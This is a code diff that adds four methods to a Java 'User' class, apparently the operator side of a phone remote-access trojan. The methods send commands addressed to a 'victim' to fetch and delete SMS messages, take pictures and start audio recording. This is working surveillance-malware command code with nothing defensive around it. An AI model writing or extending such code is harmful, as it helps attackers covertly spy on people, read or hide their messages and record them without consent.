@@ -151,4 +151,37 @@ public class User {
         sendMessage(query);
     }
 
+    public void sendGetSms(JSONArray sms, String type, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "get.sms");
+        query.put("sms", sms);
+        query.put("type", type);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
+    public void sendDeleteSms(String code, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "delete.sms");
+        query.put("code", code);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
+    public void sendTakePicture(String code, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "take.picture");
+        query.put("code", code);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
+    public void sendStartAudioRecord(String code, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "start.audio.record");
+        query.put("code", code);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
 }
